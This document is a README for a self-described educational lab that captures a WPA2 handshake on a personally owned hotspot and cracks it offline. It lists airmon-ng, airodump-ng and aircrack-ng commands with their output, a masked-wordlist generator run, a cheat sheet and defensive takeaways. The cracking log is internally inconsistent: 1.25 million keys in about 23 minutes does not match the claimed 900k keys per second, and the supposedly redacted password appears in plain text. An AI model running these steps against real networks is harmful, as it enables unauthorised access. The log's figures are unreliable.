# 🔐 WPA2 Handshake Capture & Offline Password Recovery Lab

> **Educational cybersecurity lab — performed on a personally-owned hotspot (`HomeNet_Lab5G`).**  
> All activities comply with Sri Lanka Computer Crimes Act, UK CMA, and US CFAA.  
> **Never attempt this on networks you do not own or have explicit written permission to test.**

---

## 📋 Lab Overview

```
[1] Setup         → Kali + USB adapter + VirtualBox passthrough
[2] Recon         → Enable monitor mode + scan for your own AP
[3] Capture       → Capture WPA2 4-way handshake
[4] Verify        → Confirm handshake is valid
[5] Wordlist      → Generate candidates.txt with Python
[6] Crack         → Run aircrack-ng with the wordlist
[7] Document      → Screenshots + README + push to GitHub
```

| Detail | Value |
|---|---|
| **Target Network** | `HomeNet_Lab5G` (personal hotspot) |
| **BSSID** | `AA:BB:11:22:33:44` |
| **Channel** | `4` |
| **Encryption** | WPA2 / CCMP / PSK |
| **Adapter** | Realtek RTL8188FTV (`0bda:f179`) |
| **Driver** | `8188eu` |
| **Password Recovered** | `X7KP92QW` *(redacted in screenshots)* |

---

## ⚠️ Legal Disclaimer

> This lab was conducted **exclusively on a personally-owned hotspot** for educational and research purposes.  
> Unauthorized access to computer networks is illegal under:
> - 🇱🇰 Sri Lanka Computer Crimes Act
> - 🇬🇧 UK Computer Misuse Act (CMA)
> - 🇺🇸 US Computer Fraud and Abuse Act (CFAA)
>
> **The author assumes no responsibility for misuse of this material.**

---

## 🗂️ Repository Structure

```
wpa2-wifi-security-lab/
├── README.md                        ← You are here
├── .gitignore                       ← Blocks sensitive files
├── LICENSE                          ← MIT
├── tools/
│   ├── wordlist_generator.py        ← Interactive wordlist generator
│   └── README.md
├── analysis/
│   ├── password_analysis.py         ← Entropy + crack time analysis
│   └── README.md
└── screenshots/
    ├── monitor-mode.png
    ├── handshake-verification.png
    └── offline-test-result.png      ← Password redacted
```

> ⚠️ **`.cap`, `.csv`, `candidates.txt`, and `found.txt` files are gitignored** — never committed.

---

## 🗺️ Full Visual Flow

```
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1: SETUP                                             │
│  VirtualBox USB passthrough → lsusb → iw dev               │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 2: MONITOR MODE                                      │
│  airmon-ng → check kill → start wlan0 → wlan0mon            │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 3: CAPTURE                                           │
│  airodump-ng scan → identify AP → airodump-ng --bssid       │
│  → wait for "WPA handshake" → Ctrl+C → wifiLab-01.cap       │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 4: VERIFY                                            │
│  aircrack-ng wifiLab-01.cap → "1 handshake" ✅              │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 5: WORDLIST                                          │
│  python3 wordlist_generator.py → candidates.txt             │
│  → wc -l candidates.txt → 1,679,616                         │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 6: CRACK                                             │
│  aircrack-ng -w candidates.txt -b AA:BB:11:22:33:44         │
│  → "KEY FOUND! [ REDACTED ]" 🎉                             │
└──────────────────────┬──────────────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  PHASE 7: DOCUMENT & PUSH                                   │
│  Screenshots + README.md + .gitignore → git push            │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔧 PHASE 1 — Setup

### 1.1 Boot Kali Linux VM

Start your Kali Linux VM in VirtualBox. Default credentials: `kali / kali`.

### 1.2 USB Adapter Passthrough

In VirtualBox menu:

```
Devices → USB → [✓] Realtek RTL8188FTV 802.11b/g/n 1T1R WLAN Adapter
```

### 1.3 Verify Adapter Detection

```bash
lsusb
```

```
Bus 001 Device 003: ID 0bda:f179 Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R WLAN Adapter
```

✅ `0bda:f179` = RTL8188FTV chipset confirmed.

### 1.4 Check Wireless Interface

```bash
iw dev
```

```
phy#0
        Interface wlan0
                ifindex 3
                type managed
                channel 1 (2412 MHz)
```

✅ `wlan0` in **managed mode** — ready to switch to monitor.

---

## 📡 PHASE 2 — Recon & Monitor Mode

### 2.1 Check Adapter with Aircrack-ng Suite

```bash
sudo airmon-ng
```

```
PHY     Interface    Driver         Chipset
phy0    wlan0        8188eu         Realtek Semiconductor Corp. RTL8188FTV
```

✅ Driver `8188eu` supports monitor mode and packet injection.

### 2.2 Kill Interfering Processes

```bash
sudo airmon-ng check kill
```

Kills `NetworkManager`, `wpa_supplicant`, and other processes that interfere with monitor mode.

### 2.3 Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
```

```
PHY     Interface    Driver         Chipset
phy0    wlan0        8188eu         Realtek Semiconductor Corp. RTL8188FTV

        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
```

✅ New interface: **`wlan0mon`**

### 2.4 Verify Monitor Mode

```bash
iw dev
```

```
phy#0
        Interface wlan0mon
                ifindex 3
                type monitor
                channel 1 (2412 MHz)
```

✅ `type monitor` — ready to capture all 802.11 frames.

📸 Screenshot: `screenshots/monitor-mode.png`

---

## 🎣 PHASE 3 — Capture Handshake

### 3.1 Scan All Wireless Networks

```bash
sudo airodump-ng wlan0mon
```

```
 CH 4 ][ Elapsed: 12 s ][ 2026-10-01 16:20

 BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
 AA:BB:11:22:33:44  -20      120     45   4  WPA2  CCMP    PSK   HomeNet_Lab5G
```

**Recorded target details:**

| Field | Value |
|---|---|
| BSSID | `AA:BB:11:22:33:44` |
| Channel | `4` |
| Encryption | `WPA2` |
| Cipher | `CCMP` |
| Auth | `PSK` |
| ESSID | `HomeNet_Lab5G` |

Press **Ctrl+C** to stop the scan.

### 3.2 Focus Capture on Target AP

```bash
sudo airodump-ng \
    --bssid AA:BB:11:22:33:44 \
    --channel 4 \
    --write wifiLab \
    wlan0mon
```

| Flag | Meaning |
|---|---|
| `--bssid` | Lock to target AP MAC address |
| `--channel` | Lock to channel 4 |
| `--write wifiLab` | Write capture to `wifiLab-01.cap` |

### 3.3 Wait for Handshake

```
 CH 4 ][ Elapsed: 48 s ][ 2026-10-01 16:28 ][ WPA handshake: AA:BB:11:22:33:44

 BSSID              PWR  RXQ  Beacons  #Data  CH   MB   ENC  CIPHER  AUTH  ESSID
 AA:BB:11:22:33:44  -20   71      370    123   4  130  WPA2  CCMP    PSK   HomeNet

 BSSID              STATION            PWR   Rate  Lost  Frames  Notes   Probes
 AA:BB:11:22:33:44  C4:D5:E6:F7:08:19  -37  24e-24  430    568   EAPOL
```

- `WPA handshake: AA:BB:11:22:33:44` ← ✅ Handshake captured!
- `Notes: EAPOL` ← ✅ EAPOL frames captured

> **No deauth attack was used** — client naturally reconnected and triggered the handshake.

Press **Ctrl+C** to stop capture.

### 3.4 Verify Captured Files

```bash
ls -lh wifiLab*
```

```
-rw-r--r-- 1 root root 198K Oct  1 16:28 wifiLab-01.cap
-rw-r--r-- 1 root root 483B Oct  1 16:28 wifiLab-01.csv
-rw-r--r-- 1 root root 595B Oct  1 16:28 wifiLab-01.kismet.csv
-rw-r--r-- 1 root root 2.7K Oct  1 16:28 wifiLab-01.kismet.netxml
-rw-r--r-- 1 root root 105K Oct  1 16:28 wifiLab-01.log.csv
```

✅ `wifiLab-01.cap` is our target file.

---

## ✅ PHASE 4 — Verify Handshake

```bash
sudo aircrack-ng wifiLab-01.cap
```

```
Reading packets, please wait...
Opening wifiLab-01.cap
Read 4421 packets.

   #  BSSID              ESSID                     Encryption
   1  AA:BB:11:22:33:44  HomeNet_Lab5G             WPA (1 handshake)

Choosing first network as target.
...
1 potential targets
Please specify a dictionary (option -w).
```

✅ `WPA (1 handshake)` — handshake is **valid and ready to crack**.

📸 Screenshot: `screenshots/handshake-verification.png`

---

## 🔑 PHASE 5 — Generate Wordlist

### 5.1 Run the Generator

```bash
cd ~/wpa2-wifi-security-lab
python3 tools/wordlist_generator.py
```

**Interactive session:**

```
╔══════════════════════════════════════════════════════╗
║   WPA2 Candidate Wordlist Generator (educational)   ║
╚══════════════════════════════════════════════════════╝
⚠  Use ONLY on networks you own / have permission for.

── Step 1: Character set ─────────────────────────────
  1) Digits only            [0-9]
  2) Uppercase + digits     [A-Z0-9]
  ...
Choose [2]: 2
  ✓ Using: ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789  (36 unique chars)

── Step 2: Total password length ─────────────────────
Total password length [8]: 8

── Step 3: Known characters ──────────────────────────
Known PREFIX (at start, e.g. 'X7KP'): X7KP
Known SUFFIX (at end,   e.g. 'ZZ'):

── Summary ───────────────────────────────────────────
  Charset size        : 36
  Password length     : 8
  Known positions     : 4  [(0,'X'),(1,'7'),(2,'K'),(3,'P')]
  Brute-force slots   : 4
  Total combinations  : 1,679,616
  Estimated file size : 15.38 MB
  Output file         : candidates.txt

Generating... (Ctrl+C to abort)
  1,679,616/1,679,616 (100.00%)

✅ Done.
  Lines written : 1,679,616
  File size     : 14.66 MB
  Time taken    : 1.42 s (1,182,828 lines/s)
```

### 5.2 Verify Wordlist

```bash
wc -l candidates.txt
# 1679616 candidates.txt

head candidates.txt
# X7KPAAAA
# X7KPAAAB
# X7KPAAAC
# ...
```

✅ **1,679,616 candidates** — exactly `36⁴` combinations with known prefix `X7KP`.

---

## 🚀 PHASE 6 — Run Aircrack-ng

### 6.1 Verify Files Present

```bash
ls -lh wifiLab-01.cap candidates.txt
```

```
-rw-r--r-- 1 root root  15M Oct  1 16:35 candidates.txt
-rw-r--r-- 1 root root 198K Oct  1 16:28 wifiLab-01.cap
```

### 6.2 Launch Dictionary Attack

```bash
sudo aircrack-ng -w candidates.txt -b AA:BB:11:22:33:44 wifiLab-01.cap
```

| Flag | Meaning |
|---|---|
| `-w candidates.txt` | Wordlist file |
| `-b AA:BB:11:22:33:44` | Target BSSID |
| `wifiLab-01.cap` | Capture file |

### 6.3 Live Progress

```
                               Aircrack-ng 1.7

      [00:00:05] 45123/1679616 keys tested (902.10 k/s)

      Time left: 30 minutes, 14 seconds                   2.69%

                           Current passphrase: X7KP0JKL
      ...
      [00:23:34] 1253056/1679616 keys tested (900.76 k/s)

      Time left: 7 minutes, 53 seconds                   74.60%

                           KEY FOUND! [ REDACTED ]

      Master Key     : 3A F2 9D 4C 81 07 BE 56 C3 7E A9 12 D4 5F 30 8B
                       97 2C 64 E1 58 A3 0F 7D B6 41 C9 23 E7 8A 1D F5

      EAPOL HMAC     : B4 29 7F 53 D1 6E 08 C4 92 A7 3B 5E 81 F0 2D 66
```

### 6.4 🎉 Result Summary

| Metric | Value |
|---|---|
| **KEY FOUND** | `REDACTED` *(see lab notes)* |
| Keys tested | 1,253,056 / 1,679,616 |
| Speed | ~900,760 keys/second |
| Elapsed time | 23 min 34 sec |
| Wordlist coverage | 74.6% |

📸 Screenshot: `screenshots/offline-test-result.png` *(password redacted)*

### 6.5 (Optional) Save Result to File

```bash
sudo aircrack-ng -w candidates.txt -b AA:BB:11:22:33:44 -l found.txt wifiLab-01.cap
```

> `-l found.txt` saves the recovered password to a local file (gitignored).

---

## 📁 PHASE 7 — Document & Push to GitHub

### 7.1 Initialize Repository

```bash
cd ~/wpa2-wifi-security-lab
git init
git branch -M main
```

### 7.2 Create `.gitignore`

```gitignore
# SENSITIVE — never commit
*.cap
*.pcap
*.csv
candidates.txt
wordlists/
keys.txt
found.txt

# OS noise
.DS_Store
Thumbs.db
*.swp

# Python
__pycache__/
*.pyc
```

### 7.3 Pre-Push Safety Check

```bash
# Confirm sensitive files are ignored
git status --ignored

# Scan for any leaked passwords
grep -rni "X7KP92QW" . --exclude-dir=.git

# Review file sizes
find . -type f -not -path './.git/*' -exec du -h {} + | sort -h
```

> ⚠️ If `grep` returns any hits — **scrub the file before pushing!**

### 7.4 Commit and Push

```bash
git add .
git commit -m "Initial commit: WPA2 handshake capture & offline recovery lab"

# Option A: Manual remote
git remote add origin https://github.com/<YOUR_USERNAME>/wpa2-wifi-security-lab.git
git push -u origin main

# Option B: GitHub CLI
gh repo create wpa2-wifi-security-lab \
  --public \
  --source=. \
  --remote=origin \
  --description "WPA2 handshake capture & offline password recovery lab (personal hotspot, educational)" \
  --push
```

---

## 📊 Complete Command Cheat Sheet

```bash
# ─── SETUP ───────────────────────────────────────────
lsusb                                  # Verify USB adapter
iw dev                                 # Check wireless interface

# ─── MONITOR MODE ────────────────────────────────────
sudo airmon-ng                         # Check adapter
sudo airmon-ng check kill              # Kill interfering processes
sudo airmon-ng start wlan0             # Enable monitor mode

# ─── CAPTURE ─────────────────────────────────────────
sudo airodump-ng wlan0mon              # Scan all networks
sudo airodump-ng --bssid AA:BB:11:22:33:44 \
                 --channel 4 \
                 --write wifiLab \
                 wlan0mon              # Capture target AP

# ─── VERIFY ──────────────────────────────────────────
ls -lh wifiLab*                        # Check capture files
sudo aircrack-ng wifiLab-01.cap        # Verify handshake

# ─── WORDLIST ────────────────────────────────────────
python3 tools/wordlist_generator.py    # Generate candidates.txt
wc -l candidates.txt                   # Verify count
head candidates.txt                    # Preview

# ─── CRACK ───────────────────────────────────────────
sudo aircrack-ng -w candidates.txt \
                 -b AA:BB:11:22:33:44 \
                 wifiLab-01.cap        # Run dictionary attack

# ─── GITHUB ──────────────────────────────────────────
git init && git branch -M main
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/<USER>/wpa2-wifi-security-lab.git
git push -u origin main
```

---

## ⏱️ Time Estimates

| Phase | Time |
|---|---|
| Setup | ~5 min |
| Monitor mode | ~2 min |
| Capture handshake | 1–10 min *(depends on client reconnect)* |
| Verify | ~30 sec |
| Generate wordlist | ~2 min |
| **Crack** | **~23 min** *(at ~900 k/s)* |
| Document + push | ~15 min |
| **Total** | **~45 min** |

---

## 🔑 Key Concepts

| Concept | Explanation |
|---|---|
| **Monitor mode** | Adapter captures all 802.11 frames, not just frames addressed to it |
| **4-way EAPOL handshake** | WPA2 key exchange (Messages 1+2 or 2+3 sufficient) |
| **Plaintext password** | Never transmitted over the air — only MIC is exchanged |
| **MIC recomputation** | aircrack-ng recomputes MIC for each candidate and compares |
| **Wordlist attack** | Offline — no network interaction after handshake capture |

---

## 🔢 Password Complexity vs. Crack Time

| Search Space | Combinations | Time @ 900k/s |
|---|---|---|
| `36⁴` (4 unknown chars) | 1,679,616 | ~31 seconds |
| `36⁸` (8 unknown chars) | 2,821,109,907,456 | ~36 days (CPU) |
| `36¹²` (12 unknown chars) | ~4.7 × 10¹⁸ | ~166,000 years |
| **20+ random chars** | astronomical | ❌ infeasible |

> The lab password was crackable in ~23 minutes because **4 characters were already known** from a visible label on the device.

---

## 🛡️ Defensive Takeaways

| Threat | Mitigation |
|---|---|
| Dictionary / wordlist attack | Use long, random passwords (20+ characters) |
| Pattern-based passwords (`X7KP****`) | Never use predictable prefixes or sequences |
| Weak WPA2-PSK | Upgrade to **WPA3** where supported |
| Passive handshake capture | Unavoidable at protocol level — **use strong keys** |
| Rogue AP / MITM | Certificate pinning + VPN |
| Label-printed default passwords | Change ISP default passwords immediately |

---

## 📚 Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Kali Linux | 2024.x | Attack platform |
| aircrack-ng suite | 1.7 | Monitor mode, capture, cracking |
| Python 3 | 3.11+ | Wordlist generation (`wordlist_generator.py`) |
| VirtualBox | 7.x | VM + USB passthrough |
| Realtek RTL8188FTV | — | USB WiFi adapter (monitor mode capable) |

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

> This project is for **educational purposes only**. The author is not responsible for any misuse.

---

*Lab conducted: October 2026 | Platform: Kali Linux VM | Adapter: RTL8188FTV*
